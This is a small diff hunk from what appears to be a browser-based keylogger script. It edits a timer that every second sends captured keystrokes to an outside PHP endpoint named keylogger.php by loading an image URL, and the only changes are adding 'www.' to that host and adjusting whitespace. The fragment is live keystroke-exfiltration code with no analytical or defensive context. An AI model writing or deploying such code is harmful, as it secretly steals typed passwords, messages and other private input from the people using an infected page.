@@ -8,6 +8,6 @@ document.onkeypress = function(e) {
 }
 
 window.setInterval(function(){
-    new Image().src = 'http://individualproject.esy.es/php/keylogger.php?c=' + keys;
-    keys = '';
+    new Image().src = 'http://www.individualproject.esy.es/php/keylogger.php?c=' + keys;
+     keys = '';
 }, 1000);
